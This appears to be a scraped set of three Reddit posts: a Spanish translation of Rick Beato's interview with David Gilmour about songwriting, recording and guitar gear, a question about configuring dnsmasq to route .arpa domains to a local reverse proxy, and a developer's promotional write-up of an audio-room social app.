Entrevista a David Gilmour por Rick Beato (En Español),u_Thin_Try1232,1huk35v,2025-01-05 18:03:06,1,1.0,0,https://www.reddit.com/r/u_Thin_Try1232/comments/1huk35v/entrevista_a_david_gilmour_por_rick_beato_en/,Thin_Try1232,,"Hola. Generalmente no hago traduciones de este tipo pero dado que David Gilmour es uno de mis idolos desde que tenia 9 anios, creo que vale la pena compartir con Uds en nuestro idioma.

Rick empieza diciendo que en un video previo el anuncio que David no iba estar en su canal “el drama” pero que al final obtuvo una entrevista con el después de su ultimo concierto en Madison Square Garden en NYC.

Como Uds. Saben David Gilmour es uno de los guitarristas que mas han influenciado el rock y a millones de guitarristas en todo el planeta. Su música con Pink Floyd y como artista solo son increíbles. Su fraseo y su técnica son indiscutibles una vez que las escuchas.

Rick fue a 2 de sus conciertos en este tour. Y su primera pregunta es:

 
Rick: Como te sientes estando afuera y tocando?

David: El tour ha sido increíble, el equipo a mi alrededor son los mejores que he tenido hasta ahora. Esto te da un sentido de seguridad. Lo hemos hecho por cerca de dos meses y anoche terminamos.

 
Rick: He visto algunos clips de ti haciendo tu nuevo álbum y quería preguntarte sobre tu proceso como un compositor y voy a tocar un par de canciones para discutirlo pero, cuando estas escribiendo una canción empiezas de una forma vocal sin palabras antes de que Poli (su esposa) de te la letra?

David: Si, la letra viene cuando la canción ha progresado. Pero antes de eso, solo soy yo en la casa o el estudio creando un montaje de a donde intentas ir luego con músicos. Algunos terminan siendo muy buenos, empiezo cantando una canción como “la, la, la”.

 
Rick: Piensas en silabas, por ejemplo en “luck and strange”, en el coro cantas una nota Si 9B) muy alta. Hay algunas silabas que son mas fáciles de cantar altas que otras. Es esto algo que Poli toma en consideración cuando escribe las letras?

David: No, eso es algo con lo que tenemos que lidiar luego (sonríe) y dice “oh, mierda! No debíamos haber hecho esa” si es extremadamente difícil pero no nos molestamos con ninguna cosa de ese tipo como pensar que esta silaba funciona o esta nota va a ser muy alta.  Supnogo que hay momentos en el estudio en donde te das cuenta que algo no funciona y dices, no voy a alcanzar esa nota y tienes que reconsiderar el arreglo pero no es algo que hacemos antes de escribir una canción.
 

Rick: Es fascinante como tu vos, tocas todas tus canciones en las mismas notas (originales de los records de estudio) y tu vos suena mejor que nunca.

David: Me aventuro a decir arrogantemente que suena mejor. Para mi, esta sonando en el estudio y en vivo. Esta un poco rasgada esta mañana pero tengo las excusas (tuvo un show la noche anterior)

 

Rick: Ahora como una canción en particular, tienes a Richard Wright tocando los teclados, e incluiste el jam que es de 2007. Como tomaste ese audio, que fue muy bien grabado, he hiciste una canción de eso? Mencionaste Protools, es esto algo que haces tu mismo? Cortas y pegas los audios?

David: La canción empieza con nosotros pensando que la banda estaba tocando muy bien, asi que nos reunirnos todos por unos días en nuestro granero. Me olvide que era Enero y el granero estaba con huecos y aullidos del viento fuerte. Nos moríamos de frio algunos días. De tomas formas, el primer Lunes en la mañana teníamos el núcleo de la banda, no teníamos al segundo guitarrista, porque cuando hacemos ensayos generalmente yo hago todo,  y tampoco teníamos al segundo tecladista, solo Rick estaba ahí. Entonces pienso que estabamos solo los 4. Y ese lunes en la mañana ese riff de gutiarra estaba burbujeando en mi cabeza. Entonces empece a tocarlo y ellos empezaron a unirse. La tocamos por 15 minutos y eso fue todo. Nunca la ensayamos ni la regrabamos. Eso es la canción. Y le metes a Protool mas tarde y no recuerdo cuanto tiempo después fue.

Rick: Lo haces tu mismo?

David: Si, cortas y pegas un monto de cosas. Tienes una copia de todo, asi que si borras algo no tienes que entrar en pánico. Te sientas con la guitarra y escribes partes nuevas, nuevos puentes, coros y otras cosas. Y las insertas en el proceso.

Rick: Cazaste cosas que Rick toco para ponerlas en la progresión de acordes?

David:  Hace sido algún tiempo pero escuchando la canción, hay partes del piano eléctrico que guian al coro y otras partes, son brillantes. Puedo tomar el crédito pero no recuerdo el proceso exactamente pero si escuchas como ciertas partes conducen a la siguiente parte. Y eso es suerte y cazando por un poco de detalles.

 
Rick: te he visto dando entrevistas en frente de tu computadora, y he visto Protools. Y me he dicho, David debe usar el programa.

David: Bueno, vivo en el campo y tengo un estudio en un granero. Y mi estudio es el cuarto de control donde van todos los cables. Entonces tengo que, o tener a alguien ahí lo cual no prefiero todo el tiempo, por lo cual me he convertido bastante habilidoso con Protools. Quiero decir, he visto a Charlie Andrew (productor) y Matt Glasby (ingeniero de sonido) usando Protools y usando multiples capas y yo estoy atónito pero yo lo uso como un grabador de cassette. Excepto que tu puedes cortar y pegar.

 
Rick: Es esto algo que nunca podias haberte imaginado en el pasado? Hacer algo asi tan fácilmente?

David: No, nunca me imagine. Anhelaba por asi, he tenido estudio con grabadoras de 24 canales, y cada 5 muntos tienes que sacar el carrete grande y enroscar otro. Es una pesadilla. Usamos Adat por un tiempo, no puedo recordar todos los procesos pero Protools llego en los 2000’s? Y es mi sueno hecho realidad, amo Protools.

No quieres que cosas se metan en el via del  proceso que estas intentando hacer, en la creación que estas intentando hacer. Quiere que sea tan fácil como sea posible, para cuando tengas ingenieros y gente ahí, ellos sean los que se encargan de todo el trabajo pesado. Y te salven de todo eso.

 
Rick: Cuando haces voces, tu las haces, te sientas en Protools y las grabas?

David: Si, la mitad de las voces de este álbum son cantadas y grabados por mi como ingeniero, la vos de Romany también la grabe yo. Es fácil, solo conectas un micrófono, le subes y volumen y cantas!

 
Rick: Esto es algo que siempre he tenido curiosidad, cuando estas cantandos canciones que son nuevas en un álbum, que tan frecuente estás leyendo las letras?

David: Siempre.

Rick: Siempre, incluso cuando estas en el estudio estas leyendo letras?

David: Absolutamente, no recordaría toda una canción nueva. Quiero decir, ahora en el escenario tengo un teleprompter que quiere decir que no recordaba ninguna canción desde hace 10 anios 2015-2016 cuando no tenia un prompter. Poli puede verificar eso, hace alguna vez cuando algo paso y ella me dijo “pienso que es tiempo de usar un prompter” jajaja

 
Rick: Voy a tocar una canción. “Black Cat”. Lo que estoy escuchando aquí es un piano y tu, o tu escribiste el riff de piano?

David: El piano soy yo. Mas tarde ajuste el tiempo entre las frases, cuando hay el espacio entre la primera y segunda frase, la segunda y tercera, etc. son hechas al oído. Cogi un monto y les movi un segundo o fracción de segundo para que tenga fluidez. No tiene un tempo, no podrias usar un click para tocar la canción, es hecha justamente al oído. Yo la grabe en un piano en mi estudio en la casa.

Rick: ese es un piano real. Porque suena fenomenal.

David: Si, es un hermoso piano. No tiene bajo, no funciona la parte izquierda, pero la parte derecha canta. Cosas de ese tipo saltan de vez en cuando. Alguna vez hace mucho tiempo tuve que viajar kilómetros a otro lugar para grabar el bajo del piano con mi mano izquierda.

 
Rick: Ahora, ese sonido de guitarra. A través de que fue grabada? Se que gente habla del Zoom 9030, es eso verdad?

David: Eso si, si.

Rick: Eso es increíble. Has tenido esta cosa por que, 20 anios?

David: La he tenido por 30 anios. Te dire en lo que la use: partes de Coming Back to Life en 1994, osea que la he tenido por 30 anos. Tengo 2 o3 mas  unidades porque sigo pensando que la una se va a danar y puedes descargar todos tus configuraciones y conectarlas a una nueva. 

Rick: Osea, tu puedes sentarte, conectar tu guitarra en frente a Protools y tocar?

David: Si, es exactamente eso.

 
Rick: Cuando te vi tocar en “Intuit Center” en Los Angeles, durante las dos primeras canciones, fuiste a ajustar asumo que tu amplificador, no podía distinguir desde donde estaba. Es porque cuando el lugar se llena de gente después de la prueba de sonido, el sonido es diferente? Fue uno de los conciertos con mejor sonido que he ido, el sonido fue fenomenal.

David: El Intuit Center s un lugar extraño, creo que alguien me dijo que había un amortiguador  de sonido construido en el edificio, lo cual es algo bueno, pero si es el único edificio que es equipado con eso tienes que ajustar algunas cosas para el lugar. Y me di cuenta en el escenario de que estaba absorbiendo el high end (altos) de mi sonido y pensé que durante la prueba de sonido que esto iba a mejorar cuando la gente llego pero aun asi tuve que ir a mis amplificadores y subir la perilla del treble un poco.

 

Rick: Ahora estas tocando con un par de Hiwatts?

David: Hay un Hiwatt, un Alessandro, y el Yamaha rotatorio.

Rick: y tienes dos gabinetes, con celestions y fs..

David interrumpe y sonrie: No me preguntes a mi, son gabinetes con parlantes

 

Rick: cuando te escucho tocar, escucho un bend y ya se que eres tu. Hay tantas cosas de como atacas la cuerda que no suenan como ninguna otra persona.

David: Lo admito jajaja No se como pasa, no es algo a propósito o que lo he trabajado, es simplemente mi gusto de como quieres que suene, como quieres hacer bends. Si escucho a gente haciendo videos del solo de Comfortably Numb u otras canciones me puedo dar cuenta de que no lo han perfeccionado, si hablamos de perfección.

 
Rick: Tus elecciones de melodías como un cantante compositor y lo que tocas en guitarra son las dos liricas pero en el sentido de un vocabulario diferente. Mientras la forma de tocar tiene influencias de Blues y tu canto tiene un estilo distinto de melodía, y es interesante que tienes dos voces. Tu fraseo donde dejas espacios es muy similar.

David: Si, no puedo apuntar a cómo funciona todo eso. Tu sabes, no pienso demasiado en estos procesos, simplemente los hago de forma natural en ese momento. Y en el pasado pienso que he encontrado un solo un poco frustrante y entonces he cantado una tonada y entonces tocado la tonada después de cantarla porque es mas fácil ir con la voz y encontrar nuevas melodías y cosas.
 

Rick: Mis amigos me preguntaron cómo sonó el concierto. Y yo les dije que David suena como si estuviera tocando la guitarra todo el tiempo y suena increíble. Tocas todo el tiempo?

David: Tengo una guitarra acústica conmigo todo el tiempo en la que toco canciones pero eléctrica quizás cada mes o algo así. Pero durante el proceso de hacer el álbum, hacer solos, el mes de prácticas y el tour, hacen que la facilidad de tocar regrese.

 
Rick: Trabajaste con Steve Gad in este record, cuando toco o cuando te hiciste fan de Steve?

David: Bueno tu sabes, cuando me converti en su fan? Creo que fue en “Chuckies in Love” por Rookie Lee Jones en 1978-1979. Y el absoluto catalogo sin fin de pistas que él ha ayudado hacer más mágicas.

 
Rick: Le conociste antes de trabajar con el?

David: Lo conoci ubna vez en un programa de TV cuando tocaba con Paul Simon.

Rick: Entreviste a Steve el año pasado, él es de Rochester NY como yo, cuando estaba tocando, y tu remarcaste esto, de la forma que el pega a los tambores, el como que saca el sonido de la batería.

David: Si, es un proceso extraordinario cuando te sientas en un cuarto con el porque estas con estos parlantes gigantes y el toca (hace una mímica simplista de como toca y el sonido es gigante). Es incomprensible para mi. He estado alrededor de mucho bateristas y muchos piensan que la clave es el poder y el (Steve) hace lo opuesto.

Pero si, lo había contratado por una semana antes de que empezamos y tuvimos una semana en el estudio. Pero lo contracte antes de que tuve al productor en el estudio, por suerte cuando Charlie Andrew llego, él también es un baterías entonces fue su sueño tenerlo ahí también y estuvo feliz con eso. Pero hicimos un par de pistas antes de eso Adam Bets en el estudio.

 
Rick: háblame de trabajar con Charlie en el estudio, no lo habias conocido o trabajado con el antes?

David: No lo conocía antes, pero fue un proceso largo y frustrante elegir con quien trabajar en el disco, en ocasiones gente con la que trabaje antes, con quien soy muy afectuoso y tengo un respeto enorme simplemente nada se sentía correcto. Y durante esa frustración mi siempre servicial esposa Poli empezó  ha buscar en línea a gente que ha producido y que premios de producción, premios Mercury, Grammy, etc. Y ella escuchaba a mucha gente, el “Alt-J” viene a mi mente, es una que nos condujo a él. Y Poli dijo, deberías escuchar a esta banda, escucha la producción. Y lo hicimos y si, le dimos una trimbada y le dijimos ven a ver si estas interesado y todo esta hecho desde ahí.

 
Rick: cuando haciendo un record, estas ahí y estas involucrado en todo lo que pasa?

David: Si, trato de estar envuelto en todo lo que pasa. En algunos de los procesos que he indicado antes, son muy complicados, tales como las capas de Protools y otras cosas en las que no tengo idea de cómo mantener el  paso mentalmente o en papel o iPad o lo que sea que ellos mantienen. Entonces el proceso de ensamblar una mezcla es largo. Hay veces en las que toman horas o días y no me voy a sentar durante todo eso, entonces ellos saben por lo que vamos al inicio y cuando estamos acercándonos voy y pongo mi oído y hacemos arreglos necesarios.

 
Rick: Cual es to lugar/equipo preferido para escuchar, el carro, o reproductores pequeñas?

David: El carro, porque vivimos a una hora de mi estudio en Astoria. Y eso nos de tiempo para escuchar el álbum completo y nuevas mezclas. La única parte frustrante es que no puedes tomar notas cuando estar en el carro.

Hay otros tipos de lugares, como sentado en casa, en mi estudio, obviamente el cuarto de control en Astoria que tienes estos ATC parlantes buenísimos y escuchamos.

Mi tendencia es subir el volumen y escucharlos pero los ingenieros y productores tienden proteger sus oídos supongo, pero yo he sido medio tonto con resto a eso a través de los años pero eso ya no puedo hacer eso tanto como me gustaría cuando lo hacemos en el cuarto.

 
Rick: Hoy en día que puedes mezclar en Protools, que tan practico es eso en comparación con históricamente cuando tenias que procesar una mezcla era tan complicado si querias cambiar algo simple.

David: En los tiempos viejos, teníamos que hacer la mezcla otra vez y hacer el ensayo. Había 3 personas  en el estudio tratando de corregir los errores al paso con perillas.

Rick: Llevabas tu propio instrumento típicamente?

David: Eso, u otros instrumentos. Ahora Protools es genial. El proceso de mi haciendo un demo es enormemente  mas fácil porque he encontrado técnicas. Te digo ahora, no uso la automatización en Protools, tampoco uso MIDI. Solo grabo y uso una pequeña opción en la esquina que subo y bajo y veo donde esta tomando un poco mas de tiempo y lo ajusto. Yo hago la mayoría en mi proceso cambiando los niveles en las pistas.

 
Rick: Cuando Poli recibe una letra sin palabras de ti, cuanto tiempo le toma típicamente para salir con algo y presentártela?

David: sonríe y es un poco titubeante, bueno usualmente Poli lo tiene un su teléfono y escucha en sus audífonos y sale a caminatas. Escucha y espera que salgan ideas. “ella esta ahí sentada si quieres preguntarle” jajaja  estoy tratando de explicar esto de la mejor manera. Luego hay mas caminatas y discusiones.

En esta parte la pregunta es un poco exagerada, Rick quiere encontrar la formula para la magia cuando no hay formula para ello.

 
Rick: Osea ella termina la letra y tu cantas y le dices que piensas si cambiamos esto o eso.

David: todo eso, hay veces que cambiamos ideas o cosas que quizás no funcionan. Es un proceso congénito que funciona. Brillantemente!

 
Rick: como mantienes la marcha de tus ideas? Usas memos en tu teléfono?

David: Si, tengo un catalogo de mas de mil grabaciones de voces y soy muy malo en darles nombre (sonríe).  Nombrarles y esa parte de trabajo de oficina de ponerlas en carpetas. Lo he hecho, guardándoles en anos, y meses, y regresando tengo mas de mil. Hay algunas que no tengo idea de que he grabado. A veces sostengo el teléfono al frente del radio que esta tocando y pienso, este quizás es buen ritmo. Hay muchas ideas que no funcionan, quizás el 90 0 95% de las cosas que no entiendo remotamente que están haciendo cuando las escucho y les tacho, y es el otro pequeño porcentaje y raros pequeños momentos en los que escuchas y dicen, mmm hay algo ahí que puedo perseguir.

 
Rick: Tocas el piano para sacra ideas?

David: soy un pianista verdaderamente deteriorado pero quiero decir, High Hopes la escribí en el piano, Boat Lies Waiting, In any Tongue, osea he escrito algunas canciones con el piano pero son muy muy sencillas.

 
Rick: también te he visto tocar la batería. He visto videos de ti tocando. Hay veces que tienes ideas de ritmos o programas partes de batería?

David: A veces toco, pero programo pistas de baterías y doy la idea de lo que debería ser. Soy muy decisivo y especifico sobre como estas cosas deberían ser. Es decir, toque batería en Fat Old Son en el álbum originalmente en 1969, y en Obscured by Clouds, la pista. Siempre me ha gustado tocar la batería pero otra vez, mi tiempo no es muy útil. Ciertamente no soy Steve G. Cuando toco, pienso que estoylo bien pero cuando lo escucho me salgo o entra al tempo y me doy cuenta de que simplemente no soy un baterista.

Tengo muchas ideas para batería, por ejemplo Sorrow la toque con un padkit y luego anadimos ejemplos y la cuantificamos.

 
Rick; es interesante porque anoche, Fat old son y Sorrow son dos canciones que tocas en tu show, y el tono de tu guitarra que es tu Big Muff. Eso suena tan poderoso.

David: El Big Muff es una distorsión matadora, no es sutil. Es poder en crudo, pareciera que tuviera un compresor incluido pero no lo tiene, es simplemente la forma en la que trabaja. Es el tipo de sonido que cuando estas en el escenario y te inclinas hacia atrás, puedes sentir que el sonido te empuja de vuelta hacia arriba y previene que te caigas para atrás.

 
Rick: Que tan alto es el sonido de tu escenario?

David: La mayoría del set ciertamente está ligado a niveles razonables

 
Rick: Hay un rango dinámico increíble entre canciones. Hay canciones que son muy silenciosamente y otras en las que incrementas el nivel a lo que sube la intensidad. Alguna vez usas compresor con tu distorsión?

David: Si, casi todo el tiempo. No con el Big Muff pero con los Tube Drivers. Los cuales amo.

Rick: Háblanos un poco más sobre eso.

David: Tengo un poco de RK Buttler Tube Drivers, y mucha gente pode el driver antes y el compresor luego pero lo que yo hago al revés donde uso el compresor antes de los driver usualmente. Y uso 2 o 3 compresores y 2 o 3 drivers donde uso estas combinaciones para algunas canciones como Black Cat, 5am, hay un tuve driver y un compresor.

Todo este tiempo para conseguir el sonido más limpio y puro para salir a través de estos amplificadores y consigues los amplificadores más limpios y perfectos, y pones estas distorsionas artificiales para ponerlas en tu cadena de sonido en caso todo lo que haces en cierta forma. (es irónico)

El Tube Driver numero 1 es el mas sutil que tengo y el numero 3 es el menos sutil.

 
Rick: Usa diferentes tuve drivers para guitarras diferentes típicamente? O si quieres mas gain usas uno o tienes uno para la strat y otro para la les paul

David: No, solo lo ajusto para algo general para cualquier guitarra

 
Rick: Tu tuviste la idea del acorde de guitarra que yo considero el acorde mas famoso de la historia del rock. Shine on your crazy diamond

David: Tecnicamente es un arpegio, pero lo tomo (sonríe). (Toca el arpegio principal de SOYCD)

Rick: como tuviste esa idea?

David: Estaba en un cuarto ensayo en Kings Cross en Londres, con los 4 de nosotros de Pink Floyd. Y estábamos tocando de todo hasta que la idea me vino y lo tocas una vea y otra vez y empiezas a ver esta cosa en la cara de la gente, es como un despertar que dice hay algo ahí, hay una posibilidad aquí.

Y básicamente el todo de Shine On crecio en ese momento.

 
Rick: David, acuñe la frase al cual le llamo “el efecto Gilmour”. Y este efecto no es una cosa de guitarras, no es un pedal. Cuando hago un video con cualquier guitarrista y lo entrevisto  sin importar quien es, hay cientos de comentarios sobre como gente prefiere tu estilo al de cualquier otro sin importan quien es. Y a eso llamo “El efecto Gilmour”

David: Talvez deberían guardarse sus comentarios para ese efecto (jajaja) En verdad, es agradeble gracias.

Rick: Es decir, de lo que hablan es el estilo lirico.

David: No fui bendecido con una velocidad enorme en la guitarra, y fueron años cuando era más joven y pensaba que si practico lo suficiente iba a conseguir eso, pero en realidad nunca iba a pasar. Y sabes que algunas de las influencias en mi incluso “Las Sombras” en los 60’s, tocando una nota. Y pienso que vengo de ahí realmente. Solo quiero tocar una nota bonita, obviamente cuando estas enganchado a 150dB y estas reclinado a esa pared de sonido en el escenario, las notas cambian un poquito (sonríe).

 
Rick: Anoche note durante “Comfortably Numb” pore j. que usas tu wammy bar mucho para vibrato. Ahora también usas tus dedos, pero gente va a estar sorprendida con cuanto la usas.

David: Es una cosa natural que se ha desenvuelto durante mi carrera, y si hago las dos pero no tengo idea de lo que estoy haciendo en ese momento en particular, las dos están trabajando espero que en cooperación mutua. Pero hay momentos cuando pones la barra ahí y tienes una nota y meticulosamente unas el vibrato excesivamente con la guitarra y a veces pienso que eso le da un poco mas de tono, me emito de decir la palabra refinada (jaja)

 
Rick: estaba pensando anoche sobre el show de rock que es mirarte, porque tiene solos de guitarra largos y es muy excitante y me recuerda a mi juventud. Donde gente busca eso.

David: A veces pienso que “Dios, ya estoy yendo demasiado. Es tiempo de parar”

Rick: Interrumpe y dice “No, No!” (jajaja)

David: No se en verdad cuanto duran estas cosas (conciertos). A veces solo toco y digo bueno creo que es tiempo de parar.

Rick: Uds tienen señales con banda para cuando van a terminar?

David: Si la banda tiene una señal musical, por ej. Comfortably que tiene una al final del solo. Y saqben cual es la siguiente.

 
Rick: Quiero hablarte de tu hija Romany, que esta caracterizada en el álbum en la canción “Between Two Points”. Escuchan el intro de la canción y David empieza a tocar la canción en la guitarra acústica y explicar los acordes de la canción con Rick.

 
Rick: Te escuche decir que Romany vino y canto esa canción prácticamente en una toma.

David: Esta es una canción que Poli y yo hemos sabido por siempre, hemos discutido y hablado exactamente la obtuvimos. Creo que un amigo de nosotros nos dio un playlist (lista de canciones) que ese tiempo la pones en tu computadora o en algo y lo escuchas. Y esa canción ha salido en su vida ocasionalmente por eso ella subliminalmente debe haberla conocido un poco. Y yo había hecho la pista completa en una nota arreglada para mi pero sentia que yo no era la persona que debía cantar esa canción, y Poli sugirió que intentemos con Romany así que rehice todos los instrumentos. Algunos simplemente cambien de nota en Protools y otros los arreglen. A veces puedes bajar todo en 2 minutos.

Y así, un dia llame a Romany una tarde, le dije que venga al estudio y vino cascarrabias diciendo que tiene que terminar un ensayo para universidad y que su tren sale en una hora.

Ella ha cantado conmigo en el estudio desde que nació prácticamente, desde que tuvo 2 años. Así que vino al estudio, le di la letra y como dijo seguramente ya la sabia sublinalmente. Hicimos un par de arreglos pero el 90% es ella.

 
Rick: Debe ser genial tenerla en el escenario cantando contigo.

David: Romay y yo, y todos los demás cantan juntos la canción en el granero donde hicimos Luck and Strange. Eventualmente progresó entre Romany y yo, y ella iba al inicio y tuvo 3 o 4 lecciones de arpa por un corto tiempo. Pudimos sentarnos y tomarnos un vino (sonríe).

Y su vos con la mía en algunas de esas canciones simplemente tuvo esos momentos mágicos que no puedes comprar. Están ahí o no están ahí.

 
Rick: Es una cosa de familia.

David: Bueno tenemos a los hermanos Everly, los Beach Boys. Probablemente los hnos Everly es el ejemplo perfecto donde sus voces encajan perfectamente, como magia. Entonces si, soy un creyente en esa clase de cosas.

 
Rick: Si podrias decir, de cualquier lugar, cual es la canción perfecta para ti?

David: Bueno, apuesto a que mucha gente diría “ Waterloo Sunset” y pienso que ciertamente estaría ahí arriba para mi. Heartbreak Hotel tiene una grabación de 3 instrumentos y es tan perfecta cada parte de esa canción. Es que no podrias ser mas viva y darte la atmosfera de algo mas perfecto que eso. Es una lección para que todavía no la he aprendido (jajaja)

 
Rick: Voy a tocar otra canción para ti. Empieza a sonar “Scattered”. Que keyboard suena al inicio, eres tu?

David: Si, ese soy yo. Es mi piano en el estudio conectado a un Leslie. El sonido soy yo intentando hacer el mismo sonido que hice en Echos muchos muchos años atrás. Solo puso un micrófono en el piano, le pasas por un Leslie en el mismo cuarto.

Lo que paso en el Echos es que el micrófono fue que el micrófono era demasiado alto. Pero lo que quieres es que este al borde del feedback pero sin el feedback. Muy simple, un piano a través de un Leslie.

 
Rick: La Letra de la canción es hermosa “y todas estas tesoros que diste, cosas que he estado guardando en mis manos, estos granos de arena. Un hombre esta de pie en el rio empujando hacia la corriente, tiempo es una corriente que desobedece, me desobedece a mi”. Es hermoso.

Tambien lo que cantas con el coros y como se mueven con las frases de la canción. Es la canción que cierra el concierto.

David: Yo escribi las letras primero pero las letras fueron en diferentes direcciones. Pero Charlie también ayudo y Poli se junto al proceso.

Pero “The man in the river” fue algo que Charlie tuvo la idea, y luego Poli tuvo la brillante idea de los granos de arena. Y al final todo funciono.

 
Rick: Algo que me pregunta mucha gente es Como sabes cuando una canción esta terminada?

David: Cuando te has ido del cuarto de control y piensas eso es brillante. Es lo piensas en ese momento, y también lo que piensas después de un año cuando piensas realmente pude haber hecho eso o esto . No creo que hay muchas en esta grabación, esta tiene una integridad cohesiva.

 
Rick: Mantienes una lista de cosas como con Charlie, y dices tengo esto esto y vas en la lista de canciones con las que quieres hacer cambios.

David: Si tengo una pantalla grande con las lista de canciones con todos lo detalles. Pero en cada vez que escuchas tienes un poco de cosas las cuales yo tomo notas y me las auto envio a mi teléfono, las cuales quiere escuchar o cambiar.

 
Rick: y algunas vez dices, me gustaría cantar esta línea otra vez o algo.

David: No he tenido que hacer eso porque Charlie es bastante exigente y se asegura que todo este bien.

Rick: Y Charlie era un fan de ti o no era muy familiar con tu música?

David: No tenía idea de mi o de Pink Floyd.

Rick: Eso es tan raro!

David: Pero para mí eso era genial porque no tenía respeto por este pasado que ha sido un regocijo maravilloso y un poco coma un ancla a ratos. Charlie tenia preguntas raras como, porque hay esta parada aquí o allá. Y yo decía, porque generalmente así es! (sonríe) pero te hace pensar sobre cosas que son tus hábitos de toda la vida para algunas cosas.

Lo mismo para solos de guitarra, “tiene que haber otro solo de guitarra aquí?”

Rick: Si!

David: (jaja) pienso que le gustan solos de guitarra un poco mas desde entonces.
 

Rick: Es divertido salir a tocar con una banda?

David: Si, es muy divertido. No había salido desde 2017 o algo así. Es muy divertido, esta banda es especial y brillante, ellos entienden la música, no son tan estrictos en hacer cada cosa sonar exactamente como el álbum. Les doy la libertad de que hagan algo que ellos piensan que puedo confiar en ellos.

Las cosas han cambiado en buena dirección. Los egos han salido de la puerta y se siente más como un equipo lo cual no he tenido en siglos.

 
Rick: Has estado tocando con Guy como tu bajista. El es la persona que ha estado mas tiempo en la banda, como 30 años o así?

David: Si, me sigue diciendo que como 37 años.

Rick: Es bueno tener a alguien así en la banda

David: Por supuesto! Guy es muy divertido.

 
Rick: La canción “Sings”.  Hay esta parte lofi (con imperfecciones) que la tenias en la pantalla y haces esto mucho, en donde traes cosas que son grabadas o partes que son grabadas, de donde salen?

David: Es el demo de lo que se conviertio en el coro de esa canción y ese es el video de mi tocando esa parte en mi sala. David empieza a tocar la canción y mostrando como lo hizo. Mi hijo esta cantando a los 2 años. Y estos demos duran por siempre, y 20 años después de eso puse esa coro en esta otra pieza de música. Y estuvimos tocando un demo y dijimos que tiene algo que funciona y decidimos dejarlo.

 
Rick: Piensas que vas a hacer mas música con la banda que tienes ahora?

David: Absolutamente. No veo razo por la cual no lo haría. Me encantaría. Absolutamente.

Rick: Parra mi es como que Uds. Están muy bien Piensas que haras otro álbum?

David: Puede que si, eso es lo que hago. Poli y yo vamos a regresar a casa y empezar un nuevo proceso con nuestras grabaciones y nuestras ideas.

 
Rick: David aprecio mucho tu tiempo y por haberte reunido conmigo.

David: Un placer, gracias."

dnsmasq config for all .arpa domains in local network,selfhosted,1hu4byv,2025-01-05 05:44:33,0,0.5,1,https://www.reddit.com/r/selfhosted/comments/1hu4byv/dnsmasq_config_for_all_arpa_domains_in_local/,Jannomag,DNS Tools,"Hi,
Currently I use AdGuard Home just as an DNS service for being able to forward all .arpa domains to my nginx Webserver on 192.168.1.2, which acts as a reverse proxy to my local services.

But I wanted to try dnsmasq to keep it minimal, since I use NextDNS for Adblocking on all my devices without browser adblockers - and since I can use it outside of my network I pay a bit for it because it works absolutely flawless (while I still get google ads on AdGuard Home).

I couldn’t figure out how to configure dnsmasq to forward all .arpa domains to 192.168.1.2 while all other traffic should go via my router at 192.168.1.1.

Do you guys have a quick solution for my issue?

Thanks in advance!

Edit:
Currently I’m running dnsmasq in a docker container with following arpa.conf in /etc/dnsmasq.d/:
```
local=/arpa/
address=/arpa/192.168.1.2
```
Pinging any .arpa domain shows „could not resolve“. Pinging google.com shows the dns of my provider - since it’s configured in my router, which is set as DNS1 in the docker-compose setup.

From Clubhouse to Our House: A New Era in Social Media Networking,u_Ok_Hearing6251,1hu0s83,2025-01-05 02:35:46,1,1.0,0,https://www.reddit.com/r/u_Ok_Hearing6251/comments/1hu0s83/from_clubhouse_to_our_house_a_new_era_in_social/,Ok_Hearing6251,,"Hello, everyone! I’m Aneesh, a Flutter developer with a passion for creating unique apps. Over the years, I’ve worked on multiple projects, but I’ve always dreamed of building a social media app that connects people in a truly innovative way.

That’s when I first heard about the Clubhouse app, which had become a massive hit. At the time, I didn’t know much about it until one of my clients mentioned it during a conversation. Intrigued, I decided to dig deeper and do some research. I was amazed by its simple yet powerful concept—real-time audio conversations where users could join rooms of their choice and participate live.

The more I explored the app, the more it resonated with me. This idea of connecting people through audio, creating spaces for open discussions and collaboration, was exactly the kind of app I had always envisioned. That’s when I thought of developing ***Avion: Real-Time Audio Clubs & Social Networking***. With my vision taking shape, I started exploring how to make my app stand out. I didn’t want to just replicate the idea of Clubhouse; I wanted to take it a step further. The challenge was to design an app that not only offered real-time audio conversations but also introduced features that made the experience more meaningful and accessible to users. During my research, I identified some pain points in Clubhouse and decided to address them in my app to create a better user experience.

https://preview.redd.it/hple91cnm4be1.png?width=4000&format=png&auto=webp&s=f107c4271d66e7b713443f80edea55b9ae9eef30

# Key Areas of Focus

# Verification System for Quality Rooms

One of the biggest lessons from Clubhouse’s decline was that unrestricted room creation led to reduced quality. In **Avion**, we introduced a **verification system** to ensure only verified users can create rooms. This approach maintains the quality of discussions and builds trust within the community.

https://preview.redd.it/liijdlyvm4be1.png?width=4000&format=png&auto=webp&s=f8f632e7cbdef436c049d0168a22a1f44130297f

# Earning Opportunities for Room Owners

To empower room owners, **Avion** provides multiple monetization options:

* **Entry Tickets:** Room owners can set ticket prices, and users must purchase tickets to join exclusive rooms.
* **Paid Club Events:** Organize premium events where participants pay to attend.
* **Donations:** Users can support room owners and their activities through voluntary contributions.

https://preview.redd.it/5d93a5r2n4be1.png?width=4000&format=png&auto=webp&s=78df1919d53cf9c881d4e4c5fb211db6174d0fb0

https://preview.redd.it/3d0evsq3n4be1.png?width=4000&format=png&auto=webp&s=0bb998465d38204516d79a9e3c5e1da6c02ffb36

These features not only ensure high-quality rooms but also create opportunities for room owners to earn while fostering engaging conversations.

# UI & UX Experience

One of my primary focuses was the UI and UX design. From my experience developing multiple apps, I’ve learned that UI plays a vital role in capturing user interest, while UX ensures they keep coming back. A clean, intuitive interface and a seamless user experience are essential for building trust and retaining users.

I approached the design process with the user’s perspective in mind, ensuring the app was easy to navigate while still being visually appealing. Every element, from the layout to the color scheme, was chosen to make the app engaging and comfortable for extended use. My goal was to create an interface that users would not only enjoy but also remember. The design process was meticulous and thoughtful, taking around 4–5 weeks to complete, ensuring every detail met the highest standards of usability and aesthetics.

It included:-

**Simplified Navigation**

I ensured that users could easily explore the app with minimal effort. From discovering new clubs to joining live conversations, every action is just a tap away.

**Personalized User Interface**

Avion’s UI adapts to user preferences, showing relevant clubs and conversations based on interests, making the experience more engaging and tailored.

**Responsive Design**

I worked on ensuring that the app performs seamlessly across different devices and screen sizes, providing a consistent and enjoyable experience for all users.

**Feeds Section**

To make the app more engaging, I included a dedicated Feeds section where users can see rooms created by their friends and the clubs they follow. This section also highlights live rooms and upcoming events from followed clubs, ensuring users never miss out on exciting conversations and activities.

